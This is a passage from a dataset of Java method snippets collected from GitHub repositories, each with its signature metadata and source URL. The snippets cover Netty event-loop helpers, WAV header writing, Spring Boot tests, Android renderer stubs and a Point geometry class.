setPlatform(Platform platform) {        this.platform = platform;    }", "url": "https://raw.githubusercontent.com/pengfeigao/AgoraCallApi/master/call-plugin-api/src/main/java/com/basetools/model/CreateChannelRequest.java", "stars": "1", "class": {"name": "CreateChannelRequest", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "epollIsAvailable", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "  public static boolean epollIsAvailable() {    try {      Object obj = Class.forName(\"io.netty.channel.epoll.Epoll\")              .getMethod(\"isAvailable\").invoke(null);      return null != obj && Boolean.parseBoolean(obj.toString())              && System.getProperty(\"os.name\").toLowerCase().contains(\"linux\");    } catch (Exception e) {      return false;    }  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/EventLoopKit.java", "stars": "3", "class": {"name": "EventLoopKit", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "epollGroup", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "NettyServerGroup", "snippet": "  public static NettyServerGroup epollGroup(int threadCount, int workers) {    bossEventLoopGroup = new EpollEventLoopGroup(threadCount, named(\"epoll-boss@\"));    workerEventLoopGroup = new EpollEventLoopGroup(workers, named(\"epoll-worker@\"));    return eventLoopGroupBuilder(bossEventLoopGroup, workerEventLoopGroup, EpollServerSocketChannel.class);  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/EventLoopKit.java", "stars": "3", "class": {"name": "EventLoopKit", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "nioGroup", "params": ["int", "int"], "throws": null, "modifiers": ["public", "static"], "return_type": "NettyServerGroup", "snippet": "  public static NettyServerGroup nioGroup(int threadCount, int workers) {    bossEventLoopGroup = new NioEventLoopGroup(threadCount, named(\"nio-boss@\"));    workerEventLoopGroup = new NioEventLoopGroup(workers, named(\"nio-worker@\"));    return eventLoopGroupBuilder(bossEventLoopGroup, workerEventLoopGroup, NioServerSocketChannel.class);  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/EventLoopKit.java", "stars": "3", "class": {"name": "EventLoopKit", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "eventLoopGroupBuilder", "params": ["EventLoopGroup", "EventLoopGroup", "Class<ServerChannel>"], "throws": null, "modifiers": ["private", "static"], "return_type": "NettyServerGroup", "snippet": "  private static NettyServerGroup eventLoopGroupBuilder(EventLoopGroup bossEventLoopGroup,                                                        EventLoopGroup workerEventLoopGroup,                                                        Class<? extends ServerChannel> channelClass) {    return NettyServerGroup.builder().bossGroup(bossEventLoopGroup)            .workGroup(workerEventLoopGroup).channelClass(channelClass).build();  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/EventLoopKit.java", "stars": "3", "class": {"name": "EventLoopKit", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "named", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "ThreadFactory", "snippet": "  private static ThreadFactory named(String named) {    return new NettyThreadFactory(named);  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/EventLoopKit.java", "stars": "3", "class": {"name": "EventLoopKit", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "judgeMode", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "  public static String judgeMode(String channelName) {    String NIO = \"nio\";    String EPOLL = \"epoll\";    if (channelName.toLowerCase().startsWith(NIO)) {      return NIO;    } else if (channelName.toLowerCase().startsWith(EPOLL)) {      return EPOLL;    }    return NIO;  }", "url": "https://raw.githubusercontent.com/everknwon/netty-monitor/master/src/main/java/io/netty/monitor/EventLoopKit.java", "stars": "3", "class": {"name": "EventLoopKit", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "getHeader", "params": [], "throws": ["IOException"], "modifiers": ["public"], "return_type": "byte", "snippet": "    public byte[] getHeader() throws IOException {        ByteArrayOutputStream bos = new ByteArrayOutputStream();        WriteChar(bos, fileID);        WriteInt(bos, fileLength);        WriteChar(bos, wavTag);        WriteChar(bos, FmtHdrID);        WriteInt(bos,FmtHdrLeth);        WriteShort(bos,FormatTag);        WriteShort(bos,Channels);        WriteInt(bos,SamplesPerSec);        WriteInt(bos,AvgBytesPerSec);        WriteShort(bos,BlockAlign);        WriteShort(bos,BitsPerSample);        WriteChar(bos,DataHdrID);        WriteInt(bos,DataHdrLeth);        bos.flush();        byte[] r = bos.toByteArray();        bos.close();        return r;    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/WaveHeader.java", "stars": "2", "class": {"name": "WaveHeader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "WriteShort", "params": ["ByteArrayOutputStream", "int"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void WriteShort(ByteArrayOutputStream bos, int s) throws IOException {        byte[] mybyte = new byte[2];        mybyte[1] =(byte)( (s << 16) >> 24 );        mybyte[0] =(byte)( (s << 24) >> 24 );        bos.write(mybyte);    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/WaveHeader.java", "stars": "2", "class": {"name": "WaveHeader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "WriteInt", "params": ["ByteArrayOutputStream", "int"], "throws": ["IOException"], "modifiers": ["private"], "return_type": "void", "snippet": "    private void WriteInt(ByteArrayOutputStream bos, int n) throws IOException {        byte[] buf = new byte[4];        buf[3] =(byte)( n >> 24 );        buf[2] =(byte)( (n << 8) >> 24 );        buf[1] =(byte)( (n << 16) >> 24 );        buf[0] =(byte)( (n << 24) >> 24 );        bos.write(buf);    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/WaveHeader.java", "stars": "2", "class": {"name": "WaveHeader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "WriteChar", "params": ["ByteArrayOutputStream", "char"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void WriteChar(ByteArrayOutputStream bos, char[] id) {        for (int i=0; i<id.length; i++) {            char c = id[i];            bos.write(c);        }    }", "url": "https://raw.githubusercontent.com/dreamfish797/AudioRecorder/master/record/src/main/java/com/dreamfish/record/WaveHeader.java", "stars": "2", "class": {"name": "WaveHeader", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "generoRacing", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean generoRacing(String str) {        Pattern patt = Pattern.compile(\"\\\\bRacing\");        Matcher m = patt.matcher(str);        return m.matches();    }", "url": "https://raw.githubusercontent.com/gustavost645/tarefa_reviews/master/src/main/java/br/univates/GeradorLista/MelhorJogoRacing.java", "stars": "2", "class": {"name": "MelhorJogoRacing", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "gerarPlataformaMelhorJogoRacing", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void gerarPlataformaMelhorJogoRacing(){        String line = \"\";        DecimalFormat df = new DecimalFormat(\"#.##\");                                Map<String, Info> map = new TreeMap<>();        File arq = new File(\"game-reviews.csv\");        SimpleReader file = new SimpleReader(arq.getAbsolutePath());        line = file.readLine();        line = file.readLine();        while (line != null) {            String[] col = line.split(\";\");                                    String platform = col[1];            String score = col[3];            String genero = col[4];                                              // tem algumas varia\u00e7oes do racing tbm            // fazer somente o racing?                                    if (!map.containsKey(platform) && generoRacing(genero)) {                Info i = new Info();                i.ContadorJogosRacing = 1;                i.SomadorScoreJogosRacing = Double.parseDouble(score);                map.put(platform, i);                            } else if(generoRacing(genero)) {                Info i = map.get(platform);                                i.SomadorScoreJogosRacing += Double.parseDouble(score);                i.ContadorJogosRacing++;                map.replace(platform, i);             }                         line = file.readLine();        }                 double souMelhorNota = 0;        String melhorPlat = \"\";        Set<Map.Entry<String, Info>> set = map.entrySet();                        for(Map.Entry<String, Info> teste : set){            double mediaRacing = teste.getValue().SomadorScoreJogosRacing                                 / teste.getValue().ContadorJogosRacing;            if(mediaRacing >= souMelhorNota){                souMelhorNota = mediaRacing;                melhorPlat = teste.getKey();            }                }                String valorFormatado = df.format(souMelhorNota);        System.out.println(\"A plataforma \" + melhorPlat +             \" possui os melhores jogos Racing e sua varia\u00e7\u00f5es com uma m\u00e9dia de notas de \" + valorFormatado);        //SteamOs vence com 8.9 (roubando!)    }", "url": "https://raw.githubusercontent.com/gustavost645/tarefa_reviews/master/src/main/java/br/univates/GeradorLista/MelhorJogoRacing.java", "stars": "2", "class": {"name": "MelhorJogoRacing", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid init() {\t\tthis.profiles = System.getProperty(\"spring.profiles.active\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-aop/src/test/java/smoketest/aop/SampleAopApplicationTests.java", "stars": "47572", "class": {"name": "SampleAopApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "after", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid after() {\t\tif (this.profiles != null) {\t\t\tSystem.setProperty(\"spring.profiles.active\", this.profiles);\t\t}\t\telse {\t\t\tSystem.clearProperty(\"spring.profiles.active\");\t\t}\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-aop/src/test/java/smoketest/aop/SampleAopApplicationTests.java", "stars": "47572", "class": {"name": "SampleAopApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testDefaultSettings", "params": ["CapturedOutput"], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "\tvoid testDefaultSettings(CapturedOutput output) throws Exception {\t\tSampleAopApplication.main(new String[0]);\t\tassertThat(output).contains(\"Hello Phil\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-aop/src/test/java/smoketest/aop/SampleAopApplicationTests.java", "stars": "47572", "class": {"name": "SampleAopApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testCommandLineOverrides", "params": ["CapturedOutput"], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "\tvoid testCommandLineOverrides(CapturedOutput output) throws Exception {\t\tSampleAopApplication.main(new String[] { \"--name=Gordon\" });\t\tassertThat(output).contains(\"Hello Gordon\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-aop/src/test/java/smoketest/aop/SampleAopApplicationTests.java", "stars": "47572", "class": {"name": "SampleAopApplicationTests", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "accept", "params": ["File", "long", "int"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean accept(File file, long totalSize, int totalCount) {        return totalSize <= maxSize;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/file/TotalSizeLruDiskUsage.java", "stars": "2", "class": {"name": "TotalSizeLruDiskUsage", "extends": "LruDiskUsage", "implements": null, "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        //\u6a21\u62df\u79d2\u8868        for (int i = 1; i <=60 ; i++) {            System.out.println(i);            //\u4f7f\u7528Thread\u7c7b\u7684sleep\u65b9\u6cd5\u8ba9\u7a0b\u5e8f\u7761\u77201\u79d2\u949f            try {                Thread.sleep(1000);            } catch (InterruptedException e) {                e.printStackTrace();            }        }    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/17.%E3%80%90%E7%BA%BF%E7%A8%8B%E3%80%81%E5%90%8C%E6%AD%A5%E3%80%91-%E7%AC%94%E8%AE%B0/code/06_Thread/src/com/itheima/demo03/sleep/Demo01Sleep.java", "stars": "2", "class": {"name": "Demo01Sleep", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\tpublic void onProgressChanged (android.widget.SeekBar p0, int p1, boolean p2)\t{\t\tn_onProgressChanged (p0, p1, p2);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "onProgressChanged", "params": ["android", "int", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onProgressChanged (android.widget.SeekBar p0, int p1, boolean p2)\t{\t\tn_onProgressChanged (p0, p1, p2);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onProgressChanged", "params": ["android", "int", "boolean"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onProgressChanged (android.widget.SeekBar p0, int p1, boolean p2);\tpublic void onStartTrackingTouch (android.widget.SeekBar p0)\t{\t\tn_onStartTrackingTouch (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "onStartTrackingTouch", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onStartTrackingTouch (android.widget.SeekBar p0)\t{\t\tn_onStartTrackingTouch (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onStartTrackingTouch", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onStartTrackingTouch (android.widget.SeekBar p0);\tpublic void onStopTrackingTouch (android.widget.SeekBar p0)\t{\t\tn_onStopTrackingTouch (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "onStopTrackingTouch", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onStopTrackingTouch (android.widget.SeekBar p0)\t{\t\tn_onStopTrackingTouch (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onStopTrackingTouch", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onStopTrackingTouch (android.widget.SeekBar p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/SliderRenderer.java", "stars": "2", "class": {"name": "SliderRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "apply", "params": ["Project"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void apply(Project project) {\t\tnew JavaConventions().apply(project);\t\tnew MavenPublishingConventions().apply(project);\t\tnew AsciidoctorConventions().apply(project);\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/buildSrc/src/main/java/org/springframework/boot/build/ConventionsPlugin.java", "stars": "47572", "class": {"name": "ConventionsPlugin", "extends": null, "implements": ["Plugin"], "modifiers": ["public"]}}, {"method_name": "d", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void d(String msg) {        if (isPrint && msg != null)            Log.d(defaultTag, msg);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/BleLog.java", "stars": "2", "class": {"name": "BleLog", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "i", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void i(String msg) {        if (isPrint && msg != null)            Log.i(defaultTag, msg);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/BleLog.java", "stars": "2", "class": {"name": "BleLog", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "w", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void w(String msg) {        if (isPrint && msg != null)            Log.w(defaultTag, msg);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/BleLog.java", "stars": "2", "class": {"name": "BleLog", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "e", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void e(String msg) {        if (isPrint && msg != null)            Log.e(defaultTag, msg);    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/utils/BleLog.java", "stars": "2", "class": {"name": "BleLog", "extends": null, "implements": null, "modifiers": ["public", "final"]}}, {"method_name": "main", "params": ["String"], "throws": ["InterruptedException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "public static void main(String[] args) throws InterruptedException {\t\tsetUp(\"chrome\", JIRAVM_URL);\t\tdriver.findElement(By.linkText(\"Alerts & Modals\")).click();\t\tdriver.findElement(By.linkText(\"Javascript Alerts\")).click();\t\tWebElement alertBoxButton=driver.findElement(By.xpath(\"//button[text()='Click for Prompt Box']\"));\t\tWebDriverWait wait=new WebDriverWait(driver, 10);\t\twait.until(ExpectedConditions.elementToBeClickable(alertBoxButton));\t\talertBoxButton.click();\t\tThread.sleep(3000);\t\t\tdriver.quit();\t}", "url": "https://raw.githubusercontent.com/fadimedibi/SeleniumTurkish/master/src/com/class5/Syncronization.java", "stars": "3", "class": {"name": "Syncronization", "extends": "CommonMethods", "implements": null, "modifiers": ["public"]}}, {"method_name": "isSupportStream", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isSupportStream(){            return false;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/spi/EnhancedWriter.java", "stars": "23", "class": {"name": "Job", "extends": "AbstractJobPlugin", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "syncMetaData", "params": ["MetaSchema"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void syncMetaData(MetaSchema metaSchema){        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/spi/EnhancedWriter.java", "stars": "23", "class": {"name": "Job", "extends": "AbstractJobPlugin", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "transportModes", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TransportMode", "snippet": "        public TransportMode[] transportModes(){            return new TransportMode[]{TransportMode.OFFLINE};        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/spi/EnhancedWriter.java", "stars": "23", "class": {"name": "Job", "extends": "AbstractJobPlugin", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "setProcessor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void setProcessor(String processor){            this.processor = processor;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/spi/EnhancedWriter.java", "stars": "23", "class": {"name": "Job", "extends": "AbstractJobPlugin", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "getProcessors", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getProcessors(){            return processor;        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/spi/EnhancedWriter.java", "stars": "23", "class": {"name": "Job", "extends": "AbstractJobPlugin", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "startWrite", "params": ["BasicDataReceiver<Object>", "Class<?>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void  startWrite(BasicDataReceiver<Object> receiver, Class<?> type){            //throw unsupport        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/spi/EnhancedWriter.java", "stars": "23", "class": {"name": "Task", "extends": "AbstractTaskPlugin", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "startWrite", "params": ["ChannelInput"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void startWrite(ChannelInput inputStream){            //do nothing        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/webank/wedatasphere/exchangis/datax/common/spi/EnhancedWriter.java", "stars": "23", "class": {"name": "Task", "extends": "AbstractTaskPlugin", "implements": null, "modifiers": ["public", "static", "abstract"]}}, {"method_name": "getName", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getName() {        return name;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/bean/SoundMode.java", "stars": "2", "class": {"name": "SoundMode", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setName", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setName(String name) {        this.name = name;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/bean/SoundMode.java", "stars": "2", "class": {"name": "SoundMode", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getValue() {        return value;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/bean/SoundMode.java", "stars": "2", "class": {"name": "SoundMode", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setValue", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setValue(int value) {        this.value = value;    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/bean/SoundMode.java", "stars": "2", "class": {"name": "SoundMode", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onDrawFrame", "params": ["GL10"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDrawFrame(GL10 glUnused) {        super.onDrawFrame(glUnused);        float[] transform = new float[16];        Matrix.setIdentityM(transform, 0);        Matrix.scaleM(transform, 0, 0.8f, 0.8f, 1);        GLES20.glUniformMatrix4fv(getMuMVPMatrixHandle(), 1, false, transform, 0);        GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP, 0, 4);        GLES20.glFinish();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/effect/GSYVideoGLViewCustomRender2.java", "stars": "2", "class": {"name": "GSYVideoGLViewCustomRender2", "extends": "GSYVideoGLViewSimpleRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "clone", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Point", "snippet": "    public Point clone() {        return new Point(this.x, this.y, this.z);    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "assignPoint", "params": ["Point"], "throws": null, "modifiers": ["public"], "return_type": "Point", "snippet": "    public Point assignPoint(Point point) {        if(point != null) {            this.x = point.x;            this.y = point.y;            this.z = point.z;        }        return this;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "addPoint", "params": ["Point"], "throws": null, "modifiers": ["public"], "return_type": "Point", "snippet": "    public Point addPoint(Point point) {        Point clone = this.clone();        if(point != null) {            clone.setX((clone.getX() + point.getX()));            clone.setY((clone.getY() + point.getY()));            clone.setZ((clone.getZ() + point.getZ()));        }        return clone;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "subtractPoint", "params": ["Point"], "throws": null, "modifiers": ["public"], "return_type": "Point", "snippet": "    public Point subtractPoint(Point point) {        Point clone = this.clone();        if(point != null) {            clone.setX((clone.getX() - point.getX()));            clone.setY((clone.getY() - point.getY()));            clone.setZ((clone.getZ() - point.getZ()));        }        return clone;    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPoint", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Point", "snippet": "    public Point getPoint(int direction) {        return this.getPoint(direction, 1);    }", "url": "https://raw.githubusercontent.com/billsonnn/nitro-java/master/room/src/main/java/com/nitro/room/utils/Point.java", "stars": "2", "class": {"name": "Point", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPoint", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "Point", "snippet": "    public Point getPoint(int direction, int offset) {        Point clone = this.clone();        direction = (direction % 8);        switch(direction) {            case Direction.NORTH:                clone.setY((clone.getY() - offset));                break;            case Direction.NORTH_EAST:                clone.setX((clone.getX() + offset));                clone.setY((clone.getY() - offset));                break;            case Direction.EAST:                clone.setX((clone.getX() + offset));                break;            case Direction.SOUTH_EAST:                clone.setX((clone.getX() + offset));                clone.setY((clone.getY() + offset));                break;            case Direction.SOUTH:                clone.setY((clone.getY() + offset));                break;            case Direction.SOUTH_WEST:                clone.setX((clone.getX() - offset));                clone.setY((clone.getY() + offset));                break;            case Direction.WEST:                clone.setX((clone.getX() - 